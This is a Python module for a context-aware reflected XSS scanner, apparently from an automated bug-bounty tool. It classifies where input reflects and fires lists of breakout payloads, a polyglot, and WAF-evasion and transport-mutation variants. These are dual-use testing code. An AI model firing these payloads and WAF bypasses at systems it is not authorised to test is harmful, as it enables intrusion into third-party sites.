"""Reflected XSS scanner — context-aware injection.

Process:
  1. Inject a benign sentinel marker; if it doesn't reflect, abort the
     parameter (fast-path, saves bandwidth).
  2. Locate the marker in the response body and classify the **injection
     context** by inspecting the surrounding bytes:
         html_body                <p>MARKER</p>
         html_attribute_dq        <a href="MARKER">
         html_attribute_sq        <a href='MARKER'>
         html_attribute_unq       <a href=MARKER>
         js_string_dq             var x = "MARKER";
         js_string_sq             var x = 'MARKER';
         js_template              var x = `MARKER`;
         js_block                 <script>...MARKER...</script> (free)
         css                      <style>...MARKER...</style> / style="..MARKER.."
         url_attribute            href="javascript:MARKER" / href="MARKER" w/ scheme
  3. Generate **context-specific breakout payloads** instead of firing
     blind <svg onload=...> at every parameter. Examples:
         html_attribute_dq    "><img src=x onerror=alert(`{T}`)>
         js_string_dq         ";alert(`{T}`)//
         js_template          ${alert(`{T}`)}
         css                  </style><svg/onload=alert`{T}`>
         url_attribute        javascript:alert`{T}`
     Plus a Garrett Heinrich-style polyglot as final fallback.
  4. Each breakout payload is fired in raw + WAF-evasion variants, plus
     transport-level mutations (multipart, JSON-in-GET) when the host
     looks WAF-protected (Cloudflare / Akamai / AWS WAF banner).

The bandwidth saving from the reflection probe means scope is tight and
scope is the unit cost on real bug-bounty targets.
"""
from __future__ import annotations

import asyncio
import html as html_lib
import re
from typing import TYPE_CHECKING

from core.utils import merge_query, random_token
from core.waf_evasion import evade as evade_payload, transport_variants

if TYPE_CHECKING:
    from core.orchestrator import Context


CONTEXTS = {
    "html_body":         "<p>{}</p>",
    "html_attr_dq":      '<a href="{}">x</a>',
    "html_attr_sq":      "<a href='{}'>x</a>",
    "html_attr_unq":     "<a href={}>x</a>",
    "js_string_dq":      'var sx = "{}";',
    "js_string_sq":      "var sx = '{}';",
    "js_template":       "var sx = `{}`;",
    "js_block":          "<script>var sx = {};</script>",
    "css":               "<style>body{{ color: {}; }}</style>",
    "url_attribute":     '<a href="{}">x</a>',
}


def _classify(body: str, marker: str) -> list[str]:
    """Return a list of detected contexts for *marker* in *body*. May be empty
    (no reflection) or contain multiple if the marker reflects in several
    places."""
    contexts: list[str] = []
    idx = 0
    body_low = body.lower()
    while True:
        i = body.find(marker, idx)
        if i < 0:
            break
        # Walk backwards to the nearest tag boundary or quote
        prefix = body[max(0, i - 80): i]
        suffix = body[i + len(marker): i + len(marker) + 80]

        # script / style block?
        last_open_script = body_low.rfind("<script", 0, i)
        last_close_script = body_low.rfind("</script", 0, i)
        if last_open_script > last_close_script:
            # we're inside a <script>
            # strings?
            if "'" in prefix and prefix.rfind("'") > prefix.rfind('"'):
                contexts.append("js_string_sq")
            elif '"' in prefix and prefix.rfind('"') > prefix.rfind("'"):
                contexts.append("js_string_dq")
            elif "`" in prefix:
                contexts.append("js_template")
            else:
                contexts.append("js_block")
            idx = i + len(marker); continue

        last_open_style = body_low.rfind("<style", 0, i)
        last_close_style = body_low.rfind("</style", 0, i)
        if last_open_style > last_close_style:
            contexts.append("css")
            idx = i + len(marker); continue

        # inside an HTML attribute?
        last_lt = body.rfind("<", 0, i)
        last_gt = body.rfind(">", 0, i)
        if last_lt > last_gt:  # we're inside an open tag
            # find what kind of attribute boundary surrounds us
            # walk backwards from i looking for unmatched quote
            attr_window = body[last_lt: i]
            dq = attr_window.count('"') % 2 == 1
            sq = attr_window.count("'") % 2 == 1
            # check if this is a URL-shaped attribute (href / src / action)
            attr_match = re.search(r'(href|src|action|formaction|background|poster|cite|data)\s*=\s*["\']?$',
                                   attr_window, re.I)
            if attr_match:
                contexts.append("url_attribute")
            elif dq:
                contexts.append("html_attr_dq")
            elif sq:
                contexts.append("html_attr_sq")
            else:
                contexts.append("html_attr_unq")
            idx = i + len(marker); continue

        # default — HTML body
        contexts.append("html_body")
        idx = i + len(marker)

    return contexts


# context -> breakout payload templates. {T} is substituted with a unique token
BREAKOUTS: dict[str, list[str]] = {
    "html_body": [
        "<svg/onload=alert(`SX_{T}`)>",
        "<img src=x onerror=alert(`SX_{T}`)>",
        "<details open ontoggle=alert(`SX_{T}`)>",
        "<svg><animate onbegin=alert`SX_{T}` attributeName=x dur=1s>",
    ],
    "html_attr_dq": [
        "\"><img src=x onerror=alert(`SX_{T}`)>",
        "\" autofocus onfocus=alert(`SX_{T}`) x=\"",
        "\"><svg onload=alert(`SX_{T}`)>",
    ],
    "html_attr_sq": [
        "'><img src=x onerror=alert(`SX_{T}`)>",
        "' autofocus onfocus=alert(`SX_{T}`) x='",
    ],
    "html_attr_unq": [
        " autofocus onfocus=alert(`SX_{T}`)",
        "/onmouseover=alert(`SX_{T}`)",
    ],
    "js_string_dq": [
        '";alert(`SX_{T}`)//',
        '"-alert(`SX_{T}`)-"',
        '\\";alert(`SX_{T}`)//',
    ],
    "js_string_sq": [
        "';alert(`SX_{T}`)//",
        "'-alert(`SX_{T}`)-'",
    ],
    "js_template": [
        "${alert(`SX_{T}`)}",
        "`;alert(`SX_{T}`);`",
    ],
    "js_block": [
        ";alert(`SX_{T}`);",
        "-alert(`SX_{T}`)-",
    ],
    "css": [
        "</style><svg/onload=alert(`SX_{T}`)>",
        "expression(alert(`SX_{T}`))",
    ],
    "url_attribute": [
        "javascript:alert(`SX_{T}`)",
        "data:text/html,<script>alert(`SX_{T}`)</script>",
        "javascript:/*--></title></style></textarea></script></xmp>"
        "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(`SX_{T}`)//'>",
    ],
}

# Polyglot fallback (Garrett Heinrich / lcamtuf style) — works in many contexts
POLYGLOT = (
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(`SX_{T}`) )"
    "//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
    "\\x3csVg/<sVg/oNloAd=alert(`SX_{T}`)//>\\x3e"
)


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))
    techniques = ctx.config.get("waf_evasion", {}).get("techniques") or []

    async def test_param(param: str) -> None:
        # 1) reflection probe with a benign sentinel
        marker = f"sx{random_token(8)}"
        async with sem:
            ev = await _request(ctx, url, method, param, marker, form)
        body = ev.response_body or ""
        if marker not in body:
            return
        contexts = _classify(body, marker)
        if not contexts:
            contexts = ["html_body"]  # default fallback

        # 2) for each detected context, fire context-specific breakouts
        primary_context = contexts[0]
        breakouts = BREAKOUTS.get(primary_context, BREAKOUTS["html_body"]) + [POLYGLOT]
        for tpl in breakouts:
            token = random_token(8)
            payload = tpl.replace("{T}", token)
            for variant in evade_payload(payload, techniques):
                async with sem:
                    ev_fire = await _request(ctx, url, method, param, variant, form)
                resp = ev_fire.response_body or ""
                # Did the breakout text + token survive without HTML-encoding?
                if token in resp and html_lib.escape(payload) not in resp:
                    findings.append({
                        "category": "xss",
                        "title": f"Reflected XSS in `{param}` "
                                 f"(context: {primary_context})",
                        "severity": "high", "cvss": 6.5,
                        "url": url, "parameter": param, "payload": variant,
                        "evidence": f"Token from a context-aware breakout payload "
                                    f"surfaced unencoded inside a {primary_context} "
                                    "context — payload escapes the surrounding "
                                    "delimiters and reaches an executable location.",
                        "request": f"{ev_fire.method} {ev_fire.url}",
                        "response": resp[:1500],
                        "metadata": {"detection": "context-aware",
                                     "context": primary_context,
                                     "all_contexts": contexts,
                                     "token": token},
                    })
                    ctx.memory.record_payload_result(variant, "xss", True)
                    return
            ctx.memory.record_payload_result(payload, "xss", False)

        # 3) transport-level retry — multipart / JSON-in-GET / h2 hint
        if ctx.config.get("waf_evasion", {}).get("transport_mutations"):
            for v in transport_variants(POLYGLOT.replace("{T}", random_token(6)), param=param):
                if v.get("h2_only"):
                    continue
                if v["method"] == "GET" and v.get("query"):
                    target = merge_query(url, v["query"])
                    async with sem:
                        ev_fire = await ctx.http.get(target, headers=v.get("headers") or {})
                else:
                    async with sem:
                        ev_fire = await ctx.http.post(url, data=v.get("body"),
                                                     headers=v.get("headers") or {})
                if "SX_" in (ev_fire.response_body or "") and "alert" in (ev_fire.response_body or ""):
                    findings.append({
                        "category": "xss",
                        "title": f"Reflected XSS in `{param}` via {v['name']} transport mutation",
                        "severity": "high", "cvss": 6.5,
                        "url": url, "parameter": param, "payload": v.get("body") or str(v.get("query")),
                        "evidence": f"WAF was bypassed by switching transport to `{v['name']}` — "
                                    "polyglot landed in the response unencoded.",
                        "request": f"{v['method']} {url}",
                        "response": (ev_fire.response_body or "")[:1500],
                        "metadata": {"transport": v["name"]},
                    })
                    return

    await asyncio.gather(*(test_param(p) for p in params))
    return findings


async def _request(ctx, url, method, param, value, form):
    from core.injection import send
    return await send(ctx, url, method, param, value, form)
